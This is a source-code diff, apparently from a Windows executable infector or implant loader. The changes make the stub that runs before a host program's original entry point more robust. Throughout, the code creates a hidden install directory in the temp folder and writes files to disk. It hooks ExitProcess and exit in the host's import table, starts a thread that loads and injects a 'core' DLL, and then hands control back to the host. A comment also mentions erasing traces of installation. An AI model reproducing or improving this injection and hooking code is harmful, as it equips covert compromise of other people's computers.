@@ -14,15 +14,19 @@ namespace bf = boost::filesystem;
 #ifdef WIN32
 
 #if _DEBUG
-#define PRINT_MESSAGE(msg, x) do { \
+#define MESSAGE(msg) do { pfn_OutputDebugString(msg); } while(0)
+#define MESSAGE1(msg, x) do { \
 	char* OEPstr = (char*) pfn_VirtualAlloc(NULL, 256, MEM_COMMIT, PAGE_READWRITE); \
 	pfn_sprintf(OEPstr, STRING(msg), x); \
 	pfn_OutputDebugString(OEPstr); \
 	pfn_VirtualFree(OEPstr, 0, MEM_RELEASE); \
 } while (0)
 #else
-#define PRINT_MESSAGE(msg, x)
+#define MESSAGE(msg)
+#define MESSAGE1(msg, x)
 #endif
+
+#define CHECK_CALL(pfn) do { if ( NULL == (pfn) ) goto OEP_CALL; } while(0)
 
 unsigned char JMPcode[] = { 0xE9, };
 
@@ -287,7 +291,9 @@ NEXT_ENTRY:
 		}
 	}
 	
+	//
 	// *** map call addresses to function pointers
+	//
 	
 #ifdef _DEBUG
 	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
@@ -342,15 +348,32 @@ NEXT_ENTRY:
 	// GOTO OEP_CALL FROM NOW ON ONLY!!!
 	//
 	
+	//
+	// *** verify essential calls (optional calls should be verified before each use) ***
+	//
+	CHECK_CALL( pfn_GetVersionEx );
+	CHECK_CALL( pfn_VirtualAlloc );
+	CHECK_CALL( pfn_VirtualFree );
+	CHECK_CALL( pfn_GetEnvironmentVariable );
+	CHECK_CALL( pfn_VirtualQuery );
+	CHECK_CALL( pfn_VirtualProtect );
+	
+	//
+	// *** check OS version
+	//
 	OSVERSIONINFOA* osVersion = (OSVERSIONINFOA*) pfn_VirtualAlloc(NULL, sizeof(OSVERSIONINFOA), MEM_COMMIT, PAGE_READWRITE);
+	if (NULL == osVersion)
+		goto OEP_CALL;
+	
 	_MEMSET_(osVersion, 0, sizeof(OSVERSIONINFOA));
 	osVersion->dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
+	
 	BOOL bVersion = pfn_GetVersionEx(osVersion);
-	if (!bVersion)
+	if ( FALSE == bVersion)
 		goto OEP_CALL;
-
-	PRINT_MESSAGE(STRIDX_SYSMAJORVER, osVersion->dwMajorVersion);
-	PRINT_MESSAGE(STRIDX_SYSMINORVER, osVersion->dwMinorVersion);
+	
+	MESSAGE1(STRIDX_SYSMAJORVER, osVersion->dwMajorVersion);
+	MESSAGE1(STRIDX_SYSMINORVER, osVersion->dwMinorVersion);
 	
 	// Verify we are not running on Windows 7 or later
 	//if (osVersion->dwMajorVersion >= 6 && osVersion->dwMinorVersion >= 2)
@@ -361,6 +384,9 @@ NEXT_ENTRY:
 	// Get user temporary directory
 	char * lpTmpEnvVar = STRING(STRIDX_TMP_ENVVAR);
 	char * lpTmpDir = (char*) pfn_VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
+	if ( NULL == lpTmpDir )
+		goto OEP_CALL;
+
 	_ZEROMEM_(lpTmpDir, MAX_PATH);
 	DWORD dwRet = pfn_GetEnvironmentVariable(lpTmpEnvVar, lpTmpDir, MAX_PATH);
 	if (dwRet == 0) {
@@ -384,24 +410,18 @@ NEXT_ENTRY:
 		*dirsep = '\0';	// cut the part after the last directory separator
 	else
 		goto OEP_CALL;
-		
+	
 	_STRCAT_(lpTmpDir, STRING(STRIDX_DIRSEP));
 	_STRCAT_(lpTmpDir, STRING(STRIDX_INSTALL_DIR)); // lpInstDir);
 	_STRCAT_(lpTmpDir, STRING(STRIDX_DIRSEP));
 	
-	// TODO remove debug string
-#ifdef _DEBUG
-	pfn_OutputDebugString(lpTmpDir);
-#endif
+	MESSAGE(lpTmpDir);
 	
 	BOOL bRet = pfn_CreateDirectory(lpTmpDir, NULL);
 	if (bRet == FALSE) {
-	
-		// TODO remove debug string
-#ifdef _DEBUG
-		pfn_OutputDebugString(STRING(STRIDX_ERRORCREDIR));
-#endif
-
+		
+		MESSAGE(STRING(STRIDX_ERRORCREDIR));
+		
 		DWORD dwLastError = pfn_GetLastError();
 		switch (dwLastError) {
 			case ERROR_ALREADY_EXISTS:
@@ -473,34 +493,42 @@ NEXT_ENTRY:
 	//
 	// Install syscall hooks
 	//
-	
 	HOOKCALL pfn_HookCall = (HOOKCALL) (((char*)header) + header->functions.hookCall.offset);
 	EXITPROCESS pfn_ExitProcessHook = (EXITPROCESS)( ((char*)header) + header->functions.exitProcessHook.offset);
 	EXIT pfn_ExitHook = (EXIT) ( ((char*)header) + header->functions.exitHook.offset);
 	
+	// we can proceed even if hooking is not successful
 	UINT_PTR IAT_rva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
-	pfn_HookCall(STRING(STRIDX_KERNEL32_DLL), header->exitProcessIndex, (DWORD)pfn_ExitProcessHook, IAT_rva, imageBase, header);
-	pfn_HookCall(STRING(STRIDX_MSVCRT_DLL), header->exitIndex, (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
-	pfn_HookCall(STRING(STRIDX_MSVCRT_DLL), header->_exitIndex, (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
+	if (pfn_HookCall && IAT_rva) {
+		if (pfn_ExitProcessHook)
+			pfn_HookCall(STRING(STRIDX_KERNEL32_DLL), header->exitProcessIndex, (DWORD)pfn_ExitProcessHook, IAT_rva, imageBase, header);
+		if (pfn_ExitHook) {
+			pfn_HookCall(STRING(STRIDX_MSVCRT_DLL), header->exitIndex, (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
+			pfn_HookCall(STRING(STRIDX_MSVCRT_DLL), header->_exitIndex, (DWORD)pfn_ExitHook, IAT_rva, imageBase, header);
+		}
+	}
 	
 	//
 	// Spawn thread to run core dll
 	//
 	
 	THREADPROC pfn_CoreThreadProc = (THREADPROC)(((char*)header) + header->functions.coreThread.offset); 
-	pfn_CreateThread(NULL, 0, pfn_CoreThreadProc, header, 0, NULL);
-
+	if (pfn_CoreThreadProc)
+		pfn_CreateThread(NULL, 0, pfn_CoreThreadProc, header, 0, NULL);
+	else {
+		// XXX installation of core failed, we should remove any traces of intallation
+		goto OEP_CALL;
+	}
+	
 OEP_CALL:
-
+	
 	//
 	// *** Restore OEP code
 	//
 	
 	OEP = ntHeaders->OptionalHeader.ImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 	
-#ifdef _DEBUG
-	pfn_OutputDebugString(STRING(STRIDX_RESTOREOEP));
-#endif
+	MESSAGE(STRING(STRIDX_RESTOREOEP));
 	
 	if (header->originalOEPCode.offset != 0)
 	{
@@ -513,11 +541,8 @@ OEP_CALL:
 		pfn_VirtualProtect((LPVOID)OEP, OEPsize, oldProtect, &oldProtect);
 	}
 	
-#ifdef _DEBUG
-	pfn_OutputDebugString(STRING(STRIDX_OEPRESTORED));
-#endif
-	
-	PRINT_MESSAGE(STRIDX_CALLINGOEP, OEP);
+	MESSAGE(STRING(STRIDX_OEPRESTORED));
+	MESSAGE1(STRIDX_CALLINGOEP, OEP);
 	
 #if 0
 	__asm {
@@ -545,9 +570,7 @@ BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DataSectio
 	CLOSEHANDLE pfn_CloseHandle = (CLOSEHANDLE) dll_calls[CALL_CLOSEHANDLE];
 	
 	// create or open the file for overwriting
-#ifdef _DEBUG
-	pfn_OutputDebugString(fileName);
-#endif
+	MESSAGE(fileName);
 
 	// restore normal attributes if the file already exists
 	pfn_SetFileAttributes(fileName, FILE_ATTRIBUTE_NORMAL);
@@ -560,9 +583,7 @@ BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DataSectio
 		FILE_ATTRIBUTE_NORMAL, 
 		NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
-#ifdef _DEBUG
-		pfn_OutputDebugString(STRING(STRIDX_CREATEFILE_ERR));
-#endif
+		MESSAGE(STRING(STRIDX_CREATEFILE_ERR));
 		return FALSE;
 	}
 	
@@ -604,10 +625,8 @@ DWORD WINAPI CoreThreadProc(__in  LPVOID lpParameter)
 	_STRCAT_( complete_path, header->dllPath);
 	_STRCAT_( complete_path, STRING(STRIDX_COMMAHFF8));
 	
-#ifdef _DEBUG
-	pfn_OutputDebugString(complete_path);
-#endif
-	
+	MESSAGE(complete_path);
+		
 	HMODULE hLib = pfn_LoadLibrary(header->dllPath);
 	if (hLib == INVALID_HANDLE_VALUE)
 		goto THREAD_EXIT;
@@ -625,15 +644,9 @@ DWORD WINAPI CoreThreadProc(__in  LPVOID lpParameter)
 	// ** INJECT CORE !!!
 	// *
 	
-#ifdef _DEBUG
-	pfn_OutputDebugString(STRING(STRIDX_HFF5CALLING));
-#endif	
-
+	MESSAGE(STRING(STRIDX_HFF5CALLING));
 	pfn_HFF5(complete_path, NULL, startupinfo, procinfo);
-
-#ifdef _DEBUG
-	pfn_OutputDebugString(STRING(STRIDX_HFF5CALLED));
-#endif
+	MESSAGE(STRING(STRIDX_HFF5CALLED));
 
 THREAD_EXIT:
 	
@@ -681,16 +694,12 @@ lbl_ref1:
 	EXITPROCESS pfn_OriginalExitProcess = (EXITPROCESS) dll_calls[CALL_EXITPROCESS];
 	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
 	
-#ifdef _DEBUG
-	pfn_OutputDebugString(STRING(STRIDX_INEXITPROC_HOOK));
-#endif
+	MESSAGE(STRING(STRIDX_INEXITPROC_HOOK));
 	
 	while (header->synchro != 1)
 		pfn_Sleep(100);
 	
-#ifdef _DEBUG
-	pfn_OutputDebugString(STRING(STRIDX_VECTORQUIT));
-#endif
+	MESSAGE(STRING(STRIDX_VECTORQUIT));
 	
 	pfn_OriginalExitProcess(uExitCode);
 }
@@ -731,17 +740,13 @@ lbl_ref1:
 	EXIT pfn_OriginalExit = (EXIT) dll_calls[CALL_EXIT];
 	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
 	
-#ifdef _DEBUG
-	pfn_OutputDebugString(STRING(STRIDX_INEXITPROC_HOOK));
-#endif
+	MESSAGE(STRING(STRIDX_INEXITPROC_HOOK));
 	
 	while (header->synchro != 1)
 		pfn_Sleep(100);
 	
-#ifdef _DEBUG
-	pfn_OutputDebugString(STRING(STRIDX_VECTORQUIT));
-#endif
-	
+	MESSAGE(STRING(STRIDX_VECTORQUIT));
+		
 	pfn_OriginalExit(status);
 }
 FUNCTION_END(ExitHook);
@@ -831,10 +836,8 @@ DWORD hookCall(char* dll, int index, DWORD hookFunc, UINT_PTR IAT_rva, DWORD ima
 				
 				IMAGE_IMPORT_BY_NAME const * name_import = (IMAGE_IMPORT_BY_NAME *)(imageBase + itd->u1.AddressOfData);
 				
-#ifdef _DEBUG
-				pfn_OutputDebugString((PCHAR)name_import->Name);
-#endif
-				
+				MESSAGE((PCHAR)name_import->Name);
+						
 				DWORD oldProtect = 0;
 				
 				MEMORY_BASIC_INFORMATION * mbi = 
@@ -854,9 +857,8 @@ DWORD hookCall(char* dll, int index, DWORD hookFunc, UINT_PTR IAT_rva, DWORD ima
 				
 				pfn_VirtualFree(mbi, 0, MEM_RELEASE);
 				
-#ifdef _DEBUG
-				pfn_OutputDebugString(STRING(STRIDX_EXITHOOKED));
-#endif
+				MESSAGE(STRING(STRIDX_EXITHOOKED));
+				
 				return true;
 			}
 			
